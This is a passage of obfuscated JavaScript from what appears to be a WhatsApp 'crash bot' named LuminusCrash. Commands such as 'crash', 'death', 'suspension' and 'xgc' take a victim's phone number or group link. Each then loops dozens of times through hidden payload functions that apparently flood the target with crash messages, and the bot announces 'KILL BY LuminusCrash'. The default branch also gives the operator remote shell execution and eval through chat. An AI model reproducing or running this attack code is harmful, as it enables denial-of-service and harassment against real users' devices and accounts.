          let _0x416907 = _0x38ce32 + "@s.whatsapp.net";
          await _0x4d73c7.sendMessage(_0x42cee0, {
            'react': {
              'text': '⚔️',
              'key': _0x22c6f2.key
            }
          });
          for (let _0x1c2291 = 0x0; _0x1c2291 < 0x64; _0x1c2291++) {
            await _0x589ed5(_0x416907);
            await sleep(0x1f4);
            await _0x18cafe(_0x416907);
            await sleep(0x1f4);
            await _0x585413(_0x416907, ptcp = true);
            await sleep(0x1f4);
            await _0x676274(_0x416907, ptcp = true);
            await sleep(0x3e8);
            await _0x298c08(_0x416907);
            await sleep(0x3e8);
            await _0x245065(_0x416907, Ptcp = true);
            await sleep(0x3e8);
            await _0x143c98(_0x416907);
            await sleep(0x3e8);
            await _0xec0644(_0x416907);
            await sleep(0x3e8);
            await _0x585413(_0x416907, ptcp = true);
            await sleep(0x3e8);
          }
          await _0x4d73c7.sendMessage(_0x42cee0, {
            'react': {
              'text': '☠️',
              'key': _0x22c6f2.key
            }
          });
          return _0x1ab039("`💀𝗞𝗜𝗟𝗟 𝗕𝗬 💠ʟᴜᴍɪɴᴜsCʀᴀsʜ💠` ⚔️\n\n> ᑭOᗯᗴᖇ ᗷY ᒪIᗰᑌᒪᗴ ᕼIᑎᑌᘜᗴᖇᗩ.");
        }
        break;
      case "crazy_ios":
      case "crazy_andro":
      case "juice_ios":
        {
          if (!_0x1c5e20) {
            return;
          }
          if (!_0xf08ce7 && !_0x37dcc3) {
            return _0x1ab039(msg.premium);
          }
          if (!q) {
            return _0x1ab039("*Exemple :* " + (_0x232cc0 + _0x17f353) + " 241x××");
          }
          await _0x1ab039(mess.sendbug);
          let _0x5b6d79 = q.replace(/[^0-9]/g, '');
          let _0x3559a4 = _0x5b6d79 + "@s.whatsapp.net";
          await _0x4d73c7.sendMessage(_0x42cee0, {
            'react': {
              'text': '⚔️',
              'key': _0x22c6f2.key
            }
          });
          for (let _0x243dc7 = 0x0; _0x243dc7 < 0x78; _0x243dc7++) {
            await _0x589ed5(_0x3559a4);
            await sleep(0x1f4);
            await _0x18cafe(_0x3559a4);
            await sleep(0x1f4);
            await _0x585413(_0x3559a4, ptcp = true);
            await sleep(0x1f4);
            await _0x676274(_0x3559a4, ptcp = true);
            await sleep(0x3e8);
            await _0x585413(_0x3559a4, ptcp = true);
            await sleep(0x3e8);
          }
          await _0x4d73c7.sendMessage(_0x42cee0, {
            'react': {
              'text': '☠️',
              'key': _0x22c6f2.key
            }
          });
          return _0x1ab039("`💀𝗞𝗜𝗟𝗟 𝗕𝗬 💠ʟᴜᴍɪɴᴜsCʀᴀsʜ💠` ⚔️\n\n> ᑭOᗯᗴᖇ ᗷY ᒪIᗰᑌᒪᗴ ᕼIᑎᑌᘜᗴᖇᗩ.");
        }
        break;
      case "death":
      case "death2":
      case "death3":
      case "death4":
        {
          if (!_0x1c5e20) {
            return;
          }
          if (!_0xf08ce7 && !_0x37dcc3) {
            return _0x1ab039(msg.premium);
          }
          if (!q) {
            return _0x1ab039("*Exemple :* " + (_0x232cc0 + _0x17f353) + " 241××");
          }
          await _0x1ab039(mess.sendbug);
          let _0x40201a = q.replace(/[^0-9]/g, '');
          let _0x5a5dec = _0x40201a + "@s.whatsapp.net";
          await _0x4d73c7.sendMessage(_0x42cee0, {
            'react': {
              'text': '⚔️',
              'key': _0x22c6f2.key
            }
          });
          for (let _0x45dc96 = 0x0; _0x45dc96 < 0x3c; _0x45dc96++) {
            await _0x589ed5(_0x5a5dec);
            await sleep(0x1f4);
            await _0x18cafe(_0x5a5dec);
            await sleep(0x1f4);
            await _0x676274(_0x5a5dec, ptcp = true);
            await sleep(0x3e8);
            await _0x585413(_0x5a5dec, ptcp = true);
            await sleep(0x3e8);
            await _0x676274(_0x5a5dec, ptcp = true);
            await sleep(0x3e8);
          }
          await _0x4d73c7.sendMessage(_0x42cee0, {
            'react': {
              'text': '☠️',
              'key': _0x22c6f2.key
            }
          });
          return _0x1ab039("`💀𝗞𝗜𝗟𝗟 𝗕𝗬 💠ʟᴜᴍɪɴᴜsCʀᴀsʜ💠\n\n> ᑭOᗯᗴᖇ ᗷY ᒪIᗰᑌᒪᗴ ᕼIᑎᑌᘜᗴᖇᗩ.");
        }
        break;
      case "crash":
      case "all_grimm":
      case "delay":
      case "crazy_off":
        {
          if (!_0x1c5e20) {
            return;
          }
          if (!_0xf08ce7 && !_0x37dcc3) {
            return _0x1ab039(msg.premium);
          }
          if (!q) {
            return _0x1ab039("*Exemple :* " + (_0x232cc0 + _0x17f353) + " 241××");
          }
          await _0x1ab039(mess.sendbug);
          let _0x8ec544 = q.replace(/[^0-9]/g, '');
          let _0x58fcc1 = _0x8ec544 + "@s.whatsapp.net";
          await _0x4d73c7.sendMessage(_0x42cee0, {
            'react': {
              'text': '⚔️',
              'key': _0x22c6f2.key
            }
          });
          for (let _0x1dc945 = 0x0; _0x1dc945 < 0x32; _0x1dc945++) {
            await _0x589ed5(_0x58fcc1);
            await sleep(0x3e8);
            await _0x18cafe(_0x58fcc1);
            await sleep(0x3e8);
            await _0x585413(_0x58fcc1, ptcp = true);
            await sleep(0x3e8);
            await _0x676274(_0x58fcc1, ptcp = true);
            await sleep(0x3e8);
          }
          await _0x4d73c7.sendMessage(_0x42cee0, {
            'react': {
              'text': '☠️',
              'key': _0x22c6f2.key
            }
          });
          return _0x1ab039("`💀𝗞𝗜𝗟𝗟 𝗕𝗬 💠ʟᴜᴍɪɴᴜsCʀᴀsʜ💠\n\n> ᑭOᗯᗴᖇ ᗷY ᒪIᗰᑌᒪᗴ ᕼIᑎᑌᘜᗴᖇᗩ.");
        }
        break;
      case "suspension":
      case '🦄':
      case '☠️':
      case '👾':
      case '🌹':
      case "🕷️":
        {
          if (!_0x1c5e20) {
            return;
          }
          if (!_0xf08ce7 && !_0x37dcc3) {
            return _0x1ab039(msg.premium);
          }
          if (!q) {
            return _0x1ab039("*Exemple :* " + (_0x232cc0 + _0x17f353) + " 241×××");
          }
          await _0x1ab039(mess.sendbug);
          let _0x14dc3f = q.replace(/[^0-9]/g, '');
          let _0x43210f = _0x14dc3f + "@s.whatsapp.net";
          await _0x4d73c7.sendMessage(_0x42cee0, {
            'react': {
              'text': '⚔️',
              'key': _0x22c6f2.key
            }
          });
          for (let _0x2bd72c = 0x0; _0x2bd72c < 0x50; _0x2bd72c++) {
            await _0x589ed5(_0x43210f);
            await _0x143c98(_0x43210f);
            await _0xec0644(_0x43210f);
            await _0x676274(_0x43210f, ptcp = true);
            await _0x585413(_0x43210f, ptcp = true);
            await _0x18cafe(_0x43210f);
          }
          await _0x4d73c7.sendMessage(_0x42cee0, {
            'react': {
              'text': '☠️',
              'key': _0x22c6f2.key
            }
          });
          return _0x1ab039("`💀𝗞𝗜𝗟𝗟 𝗕𝗬 💠ʟᴜᴍɪɴᴜsCʀᴀsʜ💠\n\n> ᑭOᗯᗴᖇ ᗷY ᒪIᗰᑌᒪᗴ ᕼIᑎᑌᘜᗴᖇᗩ.");
        }
        break;
      case "xgc":
        {
          if (!_0x1c5e20) {
            return;
          }
          if (!_0xf08ce7 && !_0x37dcc3) {
            return _0x1ab039(msg.premium);
          }
          if (!q) {
            return _0x1ab039("*Exemple :* " + (_0x232cc0 + _0x17f353) + " [lien du groupe]");
          }
          await _0x1ab039(mess.sendbug);
          if (!_0x49f768(q)) {
            return _0x1ab039("*Le lien fourni n'est pas valide.*");
          }
          await _0x4d73c7.sendMessage(_0x42cee0, {
            'react': {
              'text': '⚔️',
              'key': _0x22c6f2.key
            }
          });
          for (let _0x26ef77 = 0x0; _0x26ef77 < 0x28; _0x26ef77++) {
            await _0x19a1ce(q);
            await _0x143c98(target);
            await sleep(0xbb8);
            await _0xec0644(target);
            await sleep(0xbb8);
          }
          await _0x4d73c7.sendMessage(_0x42cee0, {
            'react': {
              'text': '☠️',
              'key': _0x22c6f2.key
            }
          });
          return _0x1ab039("`💀𝗞𝗜𝗟𝗟 𝗕𝗬 💠ʟᴜᴍɪɴᴜsCʀᴀsʜ💠\n\n> ᑭOᗯᗴᖇ ᗷY ᒪIᗰᑌᒪᗴ ᕼIᑎᑌᘜᗴᖇᗩ.");
        }
        function _0x49f768(_0x175ad3) {}
        async function _0x19a1ce(_0x45bd5f) {}
        break;
      default:
        if (_0x54c5ce.startsWith('$')) {
          if (!_0x41425e) {
            return;
          }
          exec(_0x54c5ce.slice(0x2), (_0x52b8e0, _0x584366) => {
            if (_0x52b8e0) {
              return _0x4d73c7.sendMessage(_0x22c6f2.chat, {
                'text': _0x52b8e0.toString()
              }, {
                'quoted': _0x22c6f2
              });
            }
            if (_0x584366) {
              return _0x4d73c7.sendMessage(_0x22c6f2.chat, {
                'text': util.format(_0x584366)
              }, {
                'quoted': _0x22c6f2
              });
            }
          });
        }
        if (_0x54c5ce.startsWith('>')) {
          if (!_0x41425e) {
            return;
          }
          try {
            let _0x4dfa11 = await eval(_0xd0eb9a);
            if (typeof _0x4dfa11 !== "string") {
              _0x4dfa11 = util.inspect(_0x4dfa11);
            }
            _0x4d73c7.sendMessage(_0x22c6f2.chat, {
              'text': util.format(_0x4dfa11)
            }, {
              'quoted': _0x22c6f2
            });
          } catch (_0x4fcbed) {
            _0x4d73c7.sendMessage(_0x22c6f2.chat, {
              'text': util.format(_0x4fcbed)
            }, {
              'quoted': _0x22c6f2
            });
          }
        }
        if (_0x54c5ce.startsWith('=>')) {
          if (!_0x41425e) {
            return;
          }
          try {
            const _0x251ec3 = await eval(";(async () => { " + _0xd0eb9a + " })();");
            return _0x4d73c7.sendMessage(_0x22c6f2.chat, {
              'text': util.format(_0x251ec3)
            }, {
              'quoted': _0x22c6f2
            });
          } catch (_0x1ae116) {
            return _0x4d73c7.sendMessage(_0x22c6f2.chat, {
              'text': util.format(_0x1ae116)
            }, {
              'quoted': _0x22c6f2
            });
          }
        }
    }
  } catch (_0x28c23a) {
    console.log(_0x28c23a);
    _0x4d73c7.sendMessage(owner + "@s.whatsapp.net", {
      'text': '' + util.format(_0x28c23a)
    });
  }
};
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.redBright("Update " + __filename));
  delete require.cache[file];
  require(file);
});